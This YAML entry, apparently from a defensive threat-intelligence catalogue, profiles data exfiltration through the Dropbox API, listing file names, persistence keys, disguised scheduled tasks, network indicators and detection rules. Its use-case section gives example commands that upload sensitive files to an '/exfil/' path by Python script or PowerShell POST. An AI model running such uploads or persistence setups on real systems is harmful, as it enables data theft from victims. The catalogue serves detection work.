Name: Dropbox API
Description: >
  Use of Dropbox API for data exfiltration via authenticated HTTPS calls, bypassing the official Dropbox desktop client.
Category: third-party
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - api
  - cli
Capabilities:
  - file-upload                # Supports uploading files directly via Dropbox API.
  - scheduled-execution        # Can be triggered via Scheduled Tasks or cron jobs.
  - stealth-upload             # Operates silently with minimal user interaction or logs.
  - targeted-exfiltration      # Can exfiltrate specific file paths to attacker-controlled Dropbox.

Forensics:
  FileNamePatterns:
    - dropboxapi.py
    - dropbox_client.py
    - dropbox_uploader.sh
    - dropbox.exe              # If using a compiled wrapper or renamed executable.

  BinaryLocations:
    - C:\Program Files\Dropbox\Client\Dropbox.exe
    - C:\Users\<username>\AppData\Roaming\Dropbox\bin\Dropbox.exe
    - /Applications/Dropbox.app/Contents/MacOS/Dropbox
    - ~/Dropbox/.dropbox-dist/dropboxd
    - /usr/bin/dropbox
    - /usr/local/bin/dropbox

  CommandLineArgs:
    - dropbox.Dropbox(token).files_upload
    - requests.post
    - --token
    - --filepath
    - --dropbox-path

  ConfigFiles:
    - USERPROFILE\\.dropbox_api_token
    - USERPROFILE\\AppData\\Roaming\\DropboxAPI\\config.json
    - USERPROFILE\\Documents\\dropbox_script_config.json
    - ~/.dropbox_api_token
    - ~/.config/dropbox_api/config.json

  ScheduledTask:
    - Name: DropboxExfilTask
      Description: Executes a script that uploads files via Dropbox API every 15 minutes.
      Command: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\dropbox_exfil.ps1
    - Name: SystemUpdate
      Description: Masqueraded task triggering Python-based Dropbox exfiltration.
      Command: python C:\Users\Public\update_client.py

  RegistryPersistence:
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DropboxUploader
    - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\SystemUpdater
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DropSyncService

  LogFiles:
    - ~/.dropbox/command.log
    - ~/.dropbox/logs/dropbox.log
    - C:\Users\<user>\AppData\Local\Dropbox\logs\*
    - C:\Users\<user>\Dropbox\.dropbox.cache\*
    - /var/log/dropbox.log

  NetworkArtifacts:
    Description: >
      Dropbox API traffic occurs over HTTPS, targeting official Dropbox endpoints.
      Detection may include monitoring upload spikes, token-based authentication, or unauthorized Dropbox access.
    Indicators:
      - api.dropboxapi.com
      - content.dropboxapi.com

ThreatActors:
  - ransomware
  - apt

UseCases:
  - Title: Script-based Dropbox API upload
    Description: Python script using Dropbox SDK and hardcoded token to upload sensitive files.
    Command: python dropbox_upload.py --token=<TOKEN> --filepath=C:\Sensitive\file.txt --dropbox-path=/exfil/file.txt

  - Title: Stealth PowerShell Dropbox API call
    Description: PowerShell script using Invoke-RestMethod to POST to Dropbox API endpoints.
    Command: Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -Headers $headers -Body $file

Detection:
  - Type: Process Creation
    Description: Detect python.exe or powershell.exe invoking Dropbox API scripts, especially from non-standard directories or off-hours.

  - Type: Network
    Description: Alert on POST requests to Dropbox API domains from unusual users or unauthorized endpoints.

  - Type: Persistence
    Description: Flag suspicious scheduled tasks or registry entries launching Dropbox API scripts or with obfuscated names.

  - Type: Token Storage
    Description: Monitor creation or access to token/config files not used by official Dropbox clients.

References:
  - https://help.dropbox.com/develop/developer-reference-overview
  - https://www.bleepingcomputer.com/news/security/ransomware-gangs-now-use-dropbox-for-data-exfiltration/
  - https://www.huntress.com/blog/using-backup-utilities-for-data-exfiltration
  - https://www.cisa.gov/sites/default/files/publications/cybersecurity-advisory_data-encryption-and-exfiltration-before-ransomware-deployment_2023.pdf

